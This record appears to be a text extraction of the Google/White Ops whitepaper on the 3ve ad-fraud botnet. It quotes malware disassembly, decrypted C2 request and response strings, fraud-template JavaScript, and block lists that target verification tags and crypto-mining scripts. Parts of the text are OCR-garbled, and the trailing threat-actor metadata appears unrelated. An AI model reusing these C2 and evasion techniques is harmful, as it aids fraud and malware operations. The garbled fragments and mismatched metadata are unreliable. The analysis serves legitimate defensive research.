------- ↓ FRO ------\nƒÑ]8γ ☻ ╬á♦í N E p 9 3 E 3 S h q S V b I k H\nu : x x x x x x x x x 6 4 a 7 % 2 b g C Q t n G 8 K 4 8 b J w\n2 2 0 5 4 c 8 c 2 8 8 8 e f 9 3 K 0 g Q T l g f 2 G m 6 V u q N\nb b ◙o : 6 . 2 . 9 2 0 0 ◙b : 5 O E k 4 4 M q J 5 L F u x k s\n6 4 ◙a : 0 ◙c : 1 ◙v: 1 0 0 6 m i r o c I Q p h D 9 9 8 V p\n◙s : 0 ◙r : 1 ◙1 : 2 0 0 0 ◙ W H u 8 H W 1 C 5 3 y M 2 O 1 O\nd : 1 2 ◙n : 5 ◙c p : 1 0 ◙c o R m w t 3 6 G i 7 h q Z e 3 Y\nr : f 0 5 4 6 e 2 8 ◙b t : 1 d F b I v u X J W o r s W o y F %\n2 2 5 e c . f 1 c 7 f a 1 0 ◙p 2 f u U u s 7 D c n J N a s Y 1\nn : C : \\ T e s t \\ e v e . e x S k v 8 B n B u f p h v W 1 c O\ne ◙u n : m X X X X X a c o c n O K v 8 m W d V L G Y 6 Q 0 z 7\n: D E S K T O P - 1 X X X X 0 1 3 f h W z i 4 4 r K y J I d x d\n◙c p u : 1, 1, I n t e l ( R d a k d A h i W U % 2 b v E m j\n) Core (TM) i7-66 e r y z Y L V O L i J A 0 3 % 2\n00U CPU @2.60GH f k J G N 5 1 G v B D T r n 0 4\nz◙½½½½½½½½ MYnpx4rxLpXkw9nb\n\n_3ve.1 messages before and after encryption and encoding._\n\n\n-----\n\n3ve.1 used three different sets of APIs to communicate with its C2 servers. The first request was done by\n\ninstantiating an Internet.Explorer COM Application and using its Navigate2 method to generate a GET request\n\nto http://185.118.67.195 (the IP was hard-coded and encrypted inside the binary).\n\nInstantiates Internet.Explorer.Application and Navigates\n\n; CODE XREF: Create_InternetExplorer_COM=15↑j\npush **edi** **; pvReserved**\ncall **ds:CoInitialize**\nlea **eax, [edp+ppv]**\npush **eax** **; ppv**\npush **offset riid** **; riid**\npush **4** **; dwC1sContext**\npush **edi** **; pUnkOuter**\npush **offest** **rclsid_Internet_Explorer ; rclsid**\ncall **ds:CoCreateInstance**\n\n**[...]**\n\ncall **dword ptr [ecx+OD Oh] ; iexplore.Navigate2**\nmov **esi, ds:GetTickCount**\ncall **esi ; GeTickCount**\nmov **[edp+psz], eax**\n\n_CoCreateInstance that instantiated the Internet.Explorer CLSID and spawn a windowless iexplore.exe process._\n\nThe above CoCreateInstance would instantiate the Internet.Explorer CLSID {0002DF01-0000-0000-C000\n**000000000046}, spawning a windowless iexplore.exe process, then would use its Navigate2 method to send the**\n\nencrypted PC data to their C2 server.\n\nWe were able to easily pinpoint the instantiated COM by searching the CLSID in the registry. The search returned quickly,\n\nshowing us that it belonged to Internet Explorer.\n\nInternet.Explorer.Application Registry Key\n\n_Instantiated COM registry location within Internet Explorer_\n\n\n-----\n\nfrom its own process. However, at this stage, it would set different flags using the InternetSetOptionA — this was probably\n\na measure used to bypass the local proxy. All these wininet calls were not visible in the PE import table because they were\n\nloaded at runtime via kernel32.dll LoadLibrary/GetProcAddress.\n\nThe communication from this point on would be channeled exclusively through the low-level Windows Sockets 2 API.\n\nThis both gave 3ve.1’s operators more control and bypassed the local proxy.\n\n3ve.1 C2 handshake\n\nThe binary had several hard-coded (but encrypted) hostnames inside. For example, there was an array of servers named\n\n**[d].winsrw.com where the first digit would change from 1 to 5. Once the malware was sure it had Internet access (by**\n\nsending a couple of requests to microsoft.com), it would get the IPs of those servers using the gethostbyname function.\n\nFinally, it would connect to them using the Windows socket API.\n\nThen, 3ve.1 would send the same user/PC information to one of the winsrw.com servers, expecting to receive an “OK.”\n\nBut the server is pretty selective, and checks several things before accepting: for example, Windows language/locale\n\ninformation should be English, and the IP must be in the US range.\n\nThe pseudocode below describes better how this works — just keep in mind that both the request and response\n\nare always encrypted.\n\n\nClient (Malware)\n\n**Socket->Connect(Get_IP(2.winsrw.com))**\n**Repeat Every 30”**\n**Socket->Send(PC_INFO)**\n**If (Response == “OK”)**\n**Start_Ad_Fraud (and stop checking every 30”)**\n\nServer (C2 from *.winsrw.com)\n\n**If (PC_INFO == REAL_PC AND IP_LOCATION == US)**\n**Response->”OK”**\n**Response->MORE_COMMANDS**\n**Else**\n**NO_REPLY**\n\n\n_Pseudocode describing 3ve.1’s C2 handshake_\n\nAs described above, the C2 replies back an OK if the user information matches what they consider a valid PC and\n\nif the IP is in the US.\n\n\n-----\n\nThe Internet is composed of many independent networks (referred to as “Autonomous Systems,” or ASs, each assigned a\n\nunique identifier called an ASN), all tied together via something called “Border Gateway Protocol” or (BGP). Through BGP,\n\nthese networks are able to build a globally shared “routing table” that allows them to easily determine how any one IP\n\naddress can connect to any other. The problem is that BGP was designed during a more innocent time for the Internet,\n\nwhen it was small and everybody trusted each other. While some improvements to security have been made over the\n\nyears, it still primarily relies on trust — and the implied threat of being cut off if one misbehaves. But people who attempt\n\nto game this system won’t be cut off if no one notices or cares about their misconduct, and there are still a lot of unused\n\nand forgotten IP addresses out there that criminals might use to mask unscrupulous activity. This presents an opportunity\n\nfor bad actors to do something known as “BGP hijacking.” One group of such actors came to our attention in early 2017.\n\nThe BGP hijacking operation used by 3ve had been set up long before we started seeing it used for fraud on a non-trivial\n\nscale. Historical routing data shows the core AS “ALPHA” used in the beginning of the operation came online in 2013,\n\nwhile the low-volume, low-sophistication bot activity White Ops has seen only dates back to 2015. The routing setup\n\nwas simple: just the core ALPHA AS and a few directly attached networks, connected via a single transit provider. We are\n\nuncertain whether the IP space they were using was legitimately obtained or not, but the goal of phase 1 seems to have\n\nbeen to establish some history for ALPHA before it started doing shady things.\n\n##### IPs IPs Defunct ASN 1\n\n IPs IPs Defunct ASN 2 ASN Alpha Transit\n\n IPs IPs Defunct ASN 3\n\n_Initial 3ve.1 BGP hijacking operation structure_\n\nIn early March of 2017, ALPHA began to abuse its position of trust within BGP. They chose defunct ASs that had been\n\ninactive for quite some time and set them up behind their own AS. IP addresses were required to make this useful, so they\n\nfound some IP networks that weren’t being used and began advertising them from the defunct (now zombie) ASs.\n\nALPHA was very careful about which entities it decided to impersonate — many still had functional (though badly out of date)\n\nwebsites. In many cases, ALPHA chose ASs formerly used by Internet service or hosting providers, along with IPs used by\n\ncompanies that were from the same geographic region.\n\nThe next stage of evolution came in late August. AS BRAVO came online (also in Eastern Europe), which had several transit\n\nproviders, including the one serving AS ALPHA, connecting it to the Internet. This made it more resilient in case any of its\n\ntransit providers were to bring down the hammer on its illegal activities. AS BRAVO used an even more complicated network\n\nsetup — it had several defunct ASs attached to it, each of which in turn had several more defunct ASs attached through\n\nwhich to actually route IP addresses. This configuration made it look more like a legitimate network, and also increased\n\nthe rate of “churn” of ASs and IPs so that it could respond to blocks faster. Use of AS ALPHA was slowly phased out as AS\n\nBRAVO ramped up.\n\n\n-----\n\n20,000,000\n\n15,000,000\n\n10,000,000\n\n500,000\n\n0\n\n\n4/1/2017 7/1/2017 10/1/2017 1/1/2018\n\nCurrent IPs Cumulative IPs\n\n\n_3ve.1 BGP hijacked IPs in current vs. ever in use_\n\n##### Defunct ASN 3\n Defunct ASN 1\n\n Live ASN\n\nSpoofed\n\n##### Defunct ASN 5 Connection\n\n Defunct ASN 2\n\n Live ASN\n\n_Later stage structure of 3ve.1’s BGP hijacking operation_\n\n\n-----\n\non defunct ASs, they started impersonating live, legitimately used ones as well. This works because it is perfectly fine\n\nfor the same AS to have multiple “points of presence” on the Internet as long as it’s only advertising routing for some of\n\nits IP addresses at each point. With this change, attempting to identify defunct ASs and block all their IPs would result\n\nin collateral blocking. Further, phantom connections to well known transit providers were spoofed to further muddy the\n\nwaters for automated analysis. They even appeared to be providing transit to some legitimate networks. Despite all the\n\nobfuscation, automated identification of this activity is still possible.\n\n#### 3ve.2\n\n3ve.2 used malvertising and social engineering to infect approximately 700,000 Windows computers at any given time\n\n— a truly significant reach for any cybercriminal operation. The actual infection chain has been documented in detail by\n\nKafeine and other Proofpoint staff. It is using social engineering to lure victims into downloading and executing fake Chrome,\n\nFirefox, or Flash updates. The 3ve sub-operation removed the need for data center-based browser farms, instead embedding\n\nthe entire ad fraud component into malware executed by its victims’ infected computers. This approach greatly simplified\n\nthe botnet’s data center operation by pushing complexity into the malware. 3ve.2 is responsible for the majority of 3ve’s total\n\noutbound network traffic.\n\nCounterfeit websites\n\n3ve.2’s main component was its browsing module, which was responsible for browsing counterfeit websites and\n\nsubsequently executing the ad fraud activity. These sites, hosted on servers in data centers, are templated sites\n\nthat mainly contain an ad space and its supporting ad libraries along with some scraped content from legitimate\n\nwebsites. To execute the ad fraud, 3ve.2 instructed its browser-bot army to visit these counterfeit sites, loading them\n\nin programmatically-driven browsers to generate artificial ad impressions. The ad fraud component was based on the\n\nChrome Embedded Framework (CEF), which the botnet’s authors heavily customized to better mimic a typical Chrome\n\ninstance. 3ve.2 hijacked domain name resolution (DNS) requests originating from the CEF, instructing the bot on the\n\nvictim’s machine to visit 3ve-controlled counterfeit websites instead of the original domains. Hijacking DNS resolution\n\nfor the CEF process keeps 3ve’s victims unaware of the malware on their computers. Since the DNS hijacking was\n\nisolated to the CEF requests the user’s regular browsing activity remained unaffected.\n\nWe were able to identify three different sources of counterfeit websites (referenced as templates) that 3ve.2 visited. We\n\nbelieve 3ve.2 was able to monetize capacity by counterfeiting benign websites. Below are screenshots and JavaScript\n\ncode snippets used to render the ads on each of those templates.\n\n\n-----\n\nThe top screenshot below shows an anonymized example of an original website while the bottom screenshot is the\n\ncounterfeit equivalent for the same domain. The counterfeit page only includes a video ad and a few links below it.\n\nOriginal website\n\nCounterfeit website\n\n\n-----\n\nThis HTML template is arbitrarily defining the size of the player based on the current time.\n\n\n2 var resolutions = [\n3 **[1025,575],**\n\n4 **[960,540],**\n5 **[895,500],**\n6 **[800,600],**\n7 **[700,390]**\n8 **];**\n9 **var date =** **new** **Date();**\n10 **var item = date.getMinutes() %** **5;**\n11 **var width = resolutions[item][0];**\n\n12 **var height = resolutions[item][1];**\n13 </script>\n14 **<div** **id=“ad_content”>**\n15 **<div** **id=“jw7113”></div>**\n16 **<div** **id=“banners”>**\n17 **<script src=“XXX”></script>**\n18 **<script** **language=“javascript1.1” src=“XXX”></script>**\n19 **</div>**\n20 </div>\n21 <script **type=“text/javascript”>**\n22 var playerInstance = jwplayer(‘jw7113’);\n23 playerInstance.setup({\n24 file: ‘/movies.mp4’,\n25 width: width,\n26 height: height,\n27 autostart: true,\n28 primary: ‘flash’,\n29 repeat: true,\n30 controls:false,\n31 advertising: {\n32 client: ‘vast’,\n33 tag: ‘XXX=’+width+height\n34 }\n35 });\n\n\n_3ve.2 Template B code snippet_\n\n\n-----\n\nThis template randomly decides where to place a video ad on the page by extracting arbitrary X, Y coordinates\n\nfrom the page URL.\n\n\n1 function **xy_checksum(s,t){**\n2 **var index;**\n3 **if(t==1){var checksum =** **12345678;}**\n4 **if(t==2){var checksum =** **00000000;s=s+s;}**\n5 **for (index =** **0; index < s.length; index++) {**\n6 **checksum += (s.charCodeAt(index) * (index +** **1)+t);**\n7 **}**\n8 **if(t==1){**\n9 **while(checksum>50){**\n\n10 **checksum=checksum-50;**\n11 **}**\n12 **return checksum+10;**\n13  }\n14 **if(t==2){**\n15 **while(checksum>80){**\n16 **checksum=checksum-80;**\n17 **}**\n18 **return checksum+10;**\n19 **}**\n20 }\n21 function **place_player(pl){**\n22 pl.style.position = ‘absolute’;\n23 pl.style.left=xy_checksum(window.top.location.href,1)+’%’;\n24 pl.style.top=xy_checksum(window.top.location.href,2)+’%’;\n25 }\n26 try\n27 {\n28 **ads_placer_work.add_ad_element(document.**\n**getElementById(‘mainvd’),”video”,”576x344”);**\n29 } catch(e)\n30 {\n31 **place_player(document.getElementById(‘mainvd’));**\n32 }\n\n\n_3ve.2 Template C code snippet_\n\n\n-----\n\n3ve.2 used hidden windows on a hidden desktop to conceal its activity on an infected user’s machine. It’s common for\n\nmalware that needs to hide a window to use either hidden windows or a hidden desktop, but rarely both. The hidden\n\ndesktop was discovered while analyzing a memory dump.\n\nThis added a further level of obfuscation because Windows 7 does not support multiple desktops. The exception to this\n\ntype of setup is through the use of the Windows API. The legitimate use for this feature is creating a new desktop for\n\nanother user who wants to log in. We observed that when the malware created the new desktop, it didn’t create a new\n\ninstance of explorer.exe. This meant that an analyst wouldn’t be able to easily access their tools, because there wouldn’t\n\nbe a way to create processes on this desktop due to the absence of a running instance of Explorer.\n\nFake Browsing Behavior\n\nTo avoid detection, 3ve.2 exhibited a human-like behavior through mouse movements and clicks, occasionally blocked\n\nverification libraries (by leveraging two separate techniques), while also generating false, but seemingly organic, data.\n\nMouse movements\n\nWe’ve seen 3ve.2 scroll around the screen or move the mouse in a simplified “human” manner.\n\n_Examples of mouse movements from 3ve.2_\n\n\n-----\n\nThe malware also patched some functions that are usually implemented in native code. For example, it spoofed various\n\nitems related to the environment such as the AudioContext values (see code used for AudioContext spoofing below). It also\n\nused JavaScript to find links on the page on which to click. These snippets of code were used to override the browser’s\n\nbuilt in functionality, so that the C2 could control what the browser reports to the site. So instead of running a native code\n\nfunction from the JavaScript engine, the malware’s patched version is executed to let the bot look more organic.\n\n_JavaScript code that patched properties such as maxChannelCount in the browser_\n\n\n-----\n\nThe malware contained an interesting code snippet, a few lines of JavaScript, that was used to play media on a page.\n\nThe malware authors included a few try catch statements which loop through all of the elements on a page named either\n\n‘embed’, ‘object’, or ‘video’ and then tried to call play(), playVideo(), or start() on them. It did so to try to maximize the payout\n\nfor each site visit by attempting to play the respective video ads.\n\n_JavaScript to automatically play video ads_\n\n\n-----\n\n3ve.2 used a regular expression matching technique for blocking unwanted assets on a page. This was done through a\n\nvariable in the C2’s response named bbb_l_m (more details below). When a website was loaded, the malware looped through\n\nevery URL in the site and passed each of them to a function that checked the URL against a regex to determine whether a\n\nresource should be blocked or allowed. For example, this technique was used to block the White Ops JavaScript tag.\n\n_Function’s assembly to determine whether a resource should be blocked or allowed_\n\nIf the URL matched the regular expression, the function would return 1, and the URL being operated upon would be replaced\n\nwith the string “none,” thereby blocking the resource from ever being downloaded or executed. Otherwise, If the URL didn’t\n\nmatch, the function returned 0 and the resource was not blocked.\n\nAnother method of evasion that 3ve.2 used was a string blacklist based on the components of a resource found in the\n\nbbb_j_m C2 variable. If any of these strings were identified within a resource (e.g., JavaScript or HTML), the respective\n\nresource on the website 3ve.2 visited wouldn’t get rendered or executed. For example, bbb_j_m contained strings from the\n\nWhite Ops JavaScript tag, and strings related to crypto-jacking such as cryptonight, CoinHive, CryptonightWASMWrapper,\n\nand abortOnCannotGrowMemory. 3ve.2 prevented crypto-jacking scripts from executing because they might lead to\n\ninadvertent detection of the malware.if a user noticed noticed their computer was running slower, hotter or noisier (due\n\nto fans spinning up) than normal due to the cryptocurrency mining running in the background.\n\nNon-counterfeit domains browsing\n\nFinally, in addition to visiting counterfeit websites, 3ve.2 instructed residential bots to visit legitimate domains. This was\n\nlikely done to participate in traffic-selling schemes, and to better blend in with organic traffic by gathering cookies from\n\nlegitimate websites.\n\nC2 instructions\n\n3ve.2’s ad-fraud module requested new tasks from the command & control servers every few minutes. The following\n\nrequest sent from the bot to the servers provides details about the infected machine’s state. For example, it includes\n\na unique bot id, a bot version, language, operating system version.\n\n\n**mode=3&UID=** **&clicks=3&uknerr=0&referr=0&hproc=0&fcproc=0&fproc=0&fthr1=0&fthr2=0**\n**&rlimit=0&tserro=0&terr=0&csproc=0&sserr1=0&sserr2=0&tvc=1&refh=yes&v=2.1.1.2&acptlng=en-**\n**US&chrome=1&w_cont=7&cont_err=1&lastcie=  &os_number=6.1&fd=**\n\n\n_3ve.2’s ad fraud task request (decrypted and anonymized; obtained via API hooking)_\n\n\n-----\n\nbrowser to visit a given URL with a custom environment, which e.g. includes a fake user agent, screen resolution,\n\nplugins, and a regular expression of JavaScript sources to prevent from loading (mainly for blocking verification\n\ncode and browser-based crypto mining).\n\n\n**RESP:OK|http://example.com/|<>|http://example.com/|<>|0:00:00:00:00:00:00:00:00:**\n**00::||scrl_cfg:000000-00000-68:scrl_cfg|fcs_cfg:3000-2194:fcs_cfg||p_hhw:100:p_hhw|w_w_**\n**perc:5:w_w_perc|scrtype:2:scrtype|setcpu:1:setcpu|veryfast:93:veryfast|lowl_c:0:lowl**\n**_ c | m i n m s : 4 4 : m i n m s | h s t _ c o u n t : 4 : h s t _ c o u n t | c h e c k j s c m d : 1 : c h e c k _ j s c m d | d o m s _**\n**spoof:coinhive.com>0||coin-hive.com>0||jsecoin.com>0||reasedoper.pw>0||mataharirama.**\n**xyz>0||listat.biz>0||lmodr.biz>0||minecrunch.co>0||minemytraffic.com>0||crypto-loot.com**\n**>0||2giga.link>0||ppoi.org>0||coinerra.com>0||coin-have.com>0||kisshentai.net>0||**\n**miner.pr0gramm.com>0||kiwifarms.net>0||anime.reactor.cc>0||joyreactor.cc>0||**\n**kissdoujin.com>0||minero.pw>0||coinnebula.com>0||afminer.com>0||coinblind.com>0||**\n**webmine .cz>0||monerominer.roc k s > 0 | | c d n . c l o u d c o i n s . c o > 0 | | c o i n l a b . b i z > 0 | |**\n**papoto.com>0||edgeno.de>0||jyhfuqoh.info>0||ads-miner.appspot.com>0||www.hashing.**\n**win>0||:doms_spoof||bbb_l_m:^http[^\\?&]{1,128}/█████████{██}/(█████████████).js||**\n**:bbb_l_** **m|** **bbb_j_m:cryptonight||CryptonightWASMWrapper||CoinHive||███████████████████**\n**||█████████████████||:bbb_j_m||force_use_cont_id::44::force_use_cont_id|hos crm:6.1:hos_**\n**crm|hfont_crm:Arial Greek.Arial Cyr.Leelawadee UI Semilight:hfont_crm|flash_p:plugins\\**\n**pepflashplayer32_28_0_0_126.dll:flash_p|flash_v:28.0.0.126:flash_v|enable_ex_5:1:enable_ex_5**\n**|setua:Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.**\n**3239.84 Safari/537.36:setua|scr_data:1920x1080-1920x1040-1-5-0-1.50:scr_data|spf_c_dta:9**\n**:spf_c_dta|spf_s_dt:119:2:0.01:48000:spf_s_dt|srtds:,@d:1:0,c:2:1,g:3:0,g:4:2,**\n**g:5:3,@,#00000000000000000000:srtds|spf_r_dt:83.72.1:spf_r_dt|spf_cc_dt:**\n**4:spf_cc_dt|gl_dat:packe[...]==:gl_dat|jsshh:553000000:jsshh|mrysf:2.0:mrysf|sltd:**\n**4447:sltd|sbyd:0:sbyd||hook_l_mpg:1:hook_l_mpg|enable_ex_2:1:enable_ex_2|dsth:1:dsth||<>**\n\n\n_3ve.2 tasking the embedded browser to visit a legitimate URL (plaintext extracted via API hooking; the real domain_\n\n_has been replaced with “example.com”). White Ops code is blocked (details have been redacted)._\n\nAs we described before, 3ve.2 would intermix browsing legitimate websites with counterfeit ones. 3ve.2 instructed the\n\nembedded browser to visit a redirector URL, which would issue an HTTP 302 toward the home page of the spoofed\n\nsite, passing its IP address as a parameter. The embedded browser would update its DNS records to match the given IP\n\nwith the spoofed site, which it would then visit. The spoofed site then either directly served the ad fraud payload in the\n\nresponse or would 302 redirect the browser again to the final ad fraud URL, which is a URL that existed on the legitimate\n\nversion of the site. For spoofed news sources, this final ad fraud URL was usually the URL of a news article.\n\n\n-----\n\n**Counterfeit website**\n\n**3. Counterfeit website**\n\nsends 302 redirect to\n\nad-fraud URL\n\n**4. Ad-fraud URL leads**\n\nto counterfeit page\n\nwith video ad\n\n\n**Kovter C2**\n\n**1. Client pings server**\n\nwhich replies with\n\nad-fraud config\n\n\n**Infected computer**\n\n**Redirection server**\n\n**2. 302 redirect to**\ncounterfeit website\n\n\n_Diagram: How 3ve.2 operates_\n\n\n**R E S P : O K | h t t p : / / 1 8 8 . 2 1 4 . 3 0 . 9 2 / a p i / g e t l i n k s . p h p ? c l i c k =** **& t y p e = v s p o o f _**\n**domain=** **.** **.com&land_ip=** **&group=** **&subid=** **&uid=** **|<>|htpp:**\n**//** **.** **.com/|<>|0:00:00:00:00:00:00:00:00:00::|od_od:** **.** **.com:od**\n**:fcs_cfg||p_hhw:100:p_hhw|w_w_perc:5:w_w_perc|scrtype:0:scrtype|setcpu:1setcpu|ver**\n**yfast:107:veryfast|lowl_c:0:1owl_c|minms:27:minms|hst_count:18:hst_count|check_jscm**\n**d:1:check_jscmd|doms_spoof:coinhive.com>0||coin-hive.com>0||jescoin.com>0||reasedop**\n**er.pw>0||matahariama.xyz>0||miner.pr0gramm.com>0||kiwifarms.net>0||anime.reactor.cc>0||**\n**fic.com>0||crypto-loot.com>0||2giga.link>0||ppoi.org>0||coinerra.com>0||coin-have.c**\n**om>0||kisshentai.net>0||miner.pr0gramm.com>0||kiwifarms.net>0||anime.reactor.cc>0||**\n**joyreactor.cc>0||kissdoujin.com>0||minero.pw>0||coinnebula.com>0||afminer.com>0||co**\n\n**inblind.com>0||webmine.cz>0||monerminer.rocks>0||cdn.cloudcoins.co>0||coinlab.biz>**\n**0||papoto.com>0||edgeno.de>0||jhynfuqoh.info>0||ads-miner.appspot.com>0||www.hashing**\n**.win>0||:doms_spoof||bbb_1_m:^http[^\\?&]{1,128]/** **{** **}/(**\n**).js||:bbb_1_m||bbb_j_m:cryptonight||CrytonightWASMWrapper||CoinHive||**\n**||bbb_j_m||force_use_**\n**cont_id::63::force_use_cont_id|hos_crm:10.0:hos_crm|hfont_crm:CambriaMath.Stika**\n**Display.Sitka**\n**Display:hfont_crm|flash_p:plugins\\pepflashplayer32_23_0_0_126.dll:flash_p|flash_v:2**\n**8.0.0126:flash_v|enable_ex_5:1:enable_ex_5|setua:Mozilla/5.0 (Windows NT10.0;**\n**WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.40**\n**Safari/537.36:setua|scr_data:1600x900-1600x860-1-5-0-1.00:scr_data|spf_c_dta:12:spf**\n**_c_dta|spf_s_dt:73:2:0.0000000000000.00000:spf_s_dt|srtds:,@d:1:0,c:2:1,g:3:0,@,#00**\n**0000000000000000000000:srtds|spf_r_dt:28.50.0:spf_r_dt|spf_cc_dt:2:spf_cc_dt|gt_dat:**\n**pack[...]:gl_dat|jsshh:747000000:jsshh|mrysf:2.0:mrysf|sltd:-51416:sltd|sbyd:0:sby**\n**d||hook_1_mpg:1:hook_1_mpg|enable_ex_2:1:enable_ex_2|dsth||<>**\n\n\n_3ve.2 tasking the embedded browser to visit a spoofed site (plaintext extracted via API hooking)_\n\n\n-----\n\nanti-malware software. Every few hours, 3ve’s ad fraud module would also attempt to self update.\n\n\n**mode=1&UID=** **&OS=Win 7, SP1 IL:3&OS bit= x32&v =2.1.1.2 &aff_id =519&oslang=ENU&**\n**gmt=GMT -08:00& threads =1&online =** **&cont_err =1&chrome =1&f d=**\n**f&exet=ffile&fcl=no&totalram=1023&loadram=191&freeram=465&cpuload=8&selfcpu=7&th**\n\n**rdscpu=0&ccpu=1&isafk=no&te=0&antivirus=-&firewall=-&antispyware=Windows Defender::**\n\n\n_3ve.2’s status update (plaintext extracted via API hooking)_\n\nParameters explained\n\nod_od: This parameter defines the domain to spoof. Spoofing is done by passing a domain name as the host header to an IP\n\naddress unrelated to the domain.\n\nfd_fd: IP address to browse to.\n\nsetcpu: A value used to patch the JavaScript environment. Specifically patched window.navigator.hardwareConcurrency\n\nvalue which returns the number of logical cores in the system. Has been observed to be set to 1, 2, or 4.\n\nscrl_cfg: Appears to be a “scroll config” however we have not determined exactly what the value will control.\n\ndoms_spoof: This value is a long list of domain names delimited by >0|| which is not used in fraud operations. It is meant to\n\nthrow off an analyst by making them think it’s being used for cryptojacking or by wasting their time if they choose to dive into\n\nthis domain list.\n\nbbb_l_m: This is a regular expression used to block unwanted resources from being downloaded on a site. This value has\n\nbeen a static value during our analysis and will match the White Ops client tag format. This means that the vast majority of\n\nWhite Ops JS tags will be blocked before the HTTP GET is ever requested to our tag.\n\nbbb_j_m: This is a list of blacklisted strings. Any file containing these strings will not be executed or rendered.\n\nscr_data: Screen data (1366x768-1366x728-1-5-0-1.00) where 1366x768 is the spoofed resolution of the screen, 1366x728\n\nis the real resolution of the window, and 1.00 is the scale factor.\n\nsetua: It contains the User-Agent string to use in the browsing session.\n\nspf_s_dt: This most likely stands for spoof sound data. An example of this would be 184:2:0.01:48000 where 2 is the channel\n\ncount and 48000 is the sample rate.\n\nc_dir: Points to a cache directory within the browsers folder. Each browsing session appears to get a new cache directory.\n\n\n-----\n\n3ve.2’s operators took great care in trying to prevent ad networks from noticing their illicit activity. This is why, for\n\nexample, 3ve.2 malware only fully executed in countries where organic Internet users are likely to be browsing the\n\nsame premium sites 3ve is counterfeiting, including the US, Canada, and the UK. 3ve’s victim population is shown\n\nin the figure below.\n\n_Heat map of the residential computers infected with 3ve.2 botnet around the world_\n\n_—red indicating the highest concentration of computers, green the lowest_\n\n\n-----\n\n_Number of IPs infected with the malware used by 3ve.2_\n\n3ve.2 had roughly 700,000 infections at any given point in time that were actively generating ad fraud. These IPs would\n\nfrequently change due to ISPs IP rotation (natural churn), new infections, and clean-ups. As a result, a third of those IPs\n\nwould be replaced by new ones every 4 weeks.\n\n#### 3ve.3\n\nThe final 3ve-associated sub-operation was the least sophisticated of the three in terms of the approach it used for IP\n\nexit nodes. 3ve.3 used other data centers as proxies instead of residential computers, tunnelling fraudulent traffic out\n\nof anywhere between 15,000 and 20,000 IP addresses. Using data centers instead of computers made 3ve.3’s bot\n\ntraffic more likely to be detected, but their strategy still offered its operators a good degree of agility by allowing them\n\nto find new data centers quickly when previously used data centers were blocked. We’ve found that this sub-operation’s\n\narchitecture is similar to that of 3ve.1. The sub-operation was focused on a range of ad fraud approaches, including\n\nvideo, display, and click fraud.\n\nDespite its lack of sophistication relative to other 3ve sub-operations, 3ve.3 still had a fairly complex backend, relying\n\non rogue DNS servers that rendered the content pages and resolved legitimate domains to the IP address of counterfeit,\n\n3ve-controlled sites. Additionally, 3ve.3 used sophisticated evasion techniques like tag evasion, similar to both 3ve.1\n\nand 3ve.2. However, 3ve.3’s key difference from the other sub-operations is in its exit node layer, which relied somewhat\n\nrudimentarily on data centers rather than residential computers. While this enabled them to look like tens of thousands\n\nof users viewing ads, it also made them far easier to detect.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2018/2018.11.The_Hunt_for_3ve/3ve_google_whiteops_whitepaper_final_nov_2018.pdf"
    ],
    "report_names": [
        "3ve_google_whiteops_whitepaper_final_nov_2018"
    ],
    "threat_actors": [
        {
            "id": "67bf0462-41a3-4da5-b876-187e9ef7c375",
            "created_at": "2022-10-25T16:07:23.44832Z",
            "updated_at": "2025-03-27T02:02:09.806007Z",
            "deleted_at": null,
            "main_name": "Careto",
            "aliases": [
                "Careto",
                "The Mask",
                "Ugly Face"
            ],
            "source_name": "ETDA:Careto",
            "tools": [
                "Careto"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f4f16213-7a22-4527-aecb-b964c64c2c46",
            "created_at": "2024-06-19T02:03:08.090932Z",
            "updated_at": "2025-03-27T02:05:17.387119Z",
            "deleted_at": null,
            "main_name": "GOLD NIAGARA",
            "aliases": [
                "Carbanak",
                "Carbon Spider ",
                "FIN7 ",
                "Navigator ",
                "Sangria Tempest ",
                "TelePort Crew ",
                "Calcium "
            ],
            "source_name": "Secureworks:GOLD NIAGARA",
            "tools": [
                " Carbanak",
                " Cobalt Strike",
                " DICELOADER",
                " DRIFTPIN",
                " GGLDR",
                " GRIFFON",
                " JSSLoader",
                " Meterpreter",
                " OFFTRACK",
                " PILLOWMINT",
                " POWERTRASH",
                " SUPERSOFT",
                " TAKEOUT",
                " TinyMet",
                "Bateleur"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
